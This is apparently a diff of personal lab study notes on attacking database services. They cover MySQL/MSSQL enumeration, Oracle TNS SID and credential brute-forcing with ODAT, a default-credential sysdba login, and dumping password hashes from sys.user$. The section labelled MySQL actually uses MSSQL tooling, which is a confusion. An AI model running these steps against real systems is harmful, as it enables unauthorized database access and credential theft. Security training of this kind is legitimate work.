@@ -298,7 +298,7 @@ In this assessment, weak credentials (robin:robin) allowed successful access to 
 .
 
 This exercise demonstrates how weak authentication and exposed database services can directly lead to sensitive data disclosure.
-
+``` python
 # MySQL Enumeration & Data Extraction – Command List
 
 # Scan MySQL service and enumerate version/auth info
@@ -334,3 +334,89 @@ SELECT name, email
 FROM myTable
 WHERE name LIKE '%Otto%' AND name LIKE '%Lang%';
 # Retrieves the email address associated with Otto Lang
+```
+MYSQL section
+enumeration of mysql server can be done via nmap, which will show hostnames of the server.
+
+From there you can connect to it via the username and password. If you have it. You can also run the following to enumerate the non default databases.
+Connect to SQL server via python/impacket
+```bash
+└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py backdoor@10.129.230.249 -windows-auth                      
+```
+Enumerate non default databases (anything over 4 will be non standard)
+```sql
+SELECT name FROM sys.databases WHERE database_id > 4;
+```
+
+Enumerating and Brute forcing TNS orcal databases
+**Summary**
+This module introduces Oracle Transparent Network Substrate (TNS), the core communication protocol used by Oracle databases to handle client connections, name resolution, load balancing, and secure data transport. TNS typically listens on TCP port 1521 and is widely deployed in enterprise environments such as healthcare, finance, and retail due to its scalability and built-in encryption capabilities.
+
+Two configuration files are central to Oracle networking: tnsnames.ora (client-side) and listener.ora (server-side). The tnsnames.ora file maps service names or SIDs to network addresses, while listener.ora defines which database instances the listener exposes and how it behaves. Understanding these files is critical because attackers must identify a valid SID or service name before authenticating to an Oracle database.
+
+A key concept is the System Identifier (SID), which uniquely identifies a database instance. If an incorrect SID is supplied, connections fail. SIDs can often be enumerated using tools like Nmap (oracle-sid-brute) or ODAT. Many Oracle installations still rely on predictable or default SIDs such as XE or ORCL.
+
+The module emphasizes ODAT (Oracle Database Attacking Tool) as the primary enumeration and exploitation framework. ODAT can identify valid credentials, enumerate users, extract password hashes, upload files, and exploit misconfigurations. A critical account highlighted is DBSNMP, used by Oracle monitoring services and historically configured with weak or default credentials (dbsnmp:dbsnmp). Gaining access to this account often allows attackers to extract password hashes from SYS.USER$.
+
+Once authenticated, attackers may escalate privileges (e.g., SYSDBA), dump password hashes for offline cracking, or abuse database packages to read/write files or execute commands, depending on permissions. The module demonstrates file upload via UTL_FILE and validation through HTTP access.
+
+Overall, the module’s core takeaway is that Oracle security failures often stem from weak defaults, exposed TNS listeners, and poor account hygiene, making systematic enumeration of SIDs, users, and hashes the most effective attack path.
+
+Installing ODAT
+```bash
+# 1) Base deps + libaio (Kali rolling uses libaio1t64)
+sudo apt update
+sudo apt install -y python3 python3-pip python3-venv unzip git libaio1t64
+
+# 2) libaio compatibility symlink (Instant Client expects libaio.so.1)
+sudo ln -sf /lib/x86_64-linux-gnu/libaio.so.1t64 /lib/x86_64-linux-gnu/libaio.so.1
+sudo ldconfig
+
+# 3) Download + extract Oracle Instant Client 21.4
+cd ~/odat
+wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+unzip -o instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+
+# 4) Install Instant Client to /opt/oracle + register linker path
+sudo mkdir -p /opt/oracle
+sudo rm -rf /opt/oracle/*
+sudo mv instantclient_*/* /opt/oracle/
+echo "/opt/oracle" | sudo tee /etc/ld.so.conf.d/oracle-instantclient.conf
+sudo ldconfig
+
+# 5) Set Oracle env vars for zsh + load them
+cat >> ~/.zshrc << 'EOF'
+
+# Oracle Instant Client (ODAT)
+export ORACLE_HOME=/opt/oracle
+export LD_LIBRARY_PATH=/opt/oracle:$LD_LIBRARY_PATH
+export PATH=/opt/oracle:$PATH
+EOF
+source ~/.zshrc
+
+# 6) Create + activate venv (PEP 668)
+cd ~/odat
+python3 -m venv .venv
+source .venv/bin/activate
+
+# 7) Install ODAT Python deps inside venv
+pip install --upgrade pip
+pip install cx_Oracle python-libnmap pycryptodome passlib pyasyncore
+
+# 8) Run ODAT
+python odat.py -h
+
+```
+
+Command to enumerate for passwords on oracle server
+```bash
+└─$ python odat.py all -s 10.129.205.19
+```
+that gives us scott from there can login to the server with scott
+```bash
+└─$ sqlplus scott/tiger@10.129.205.19/XE as sysdba 
+```
+pull the hashes for the other accounts
+```sql
+SQL> select name, password from sys.user$;
+```
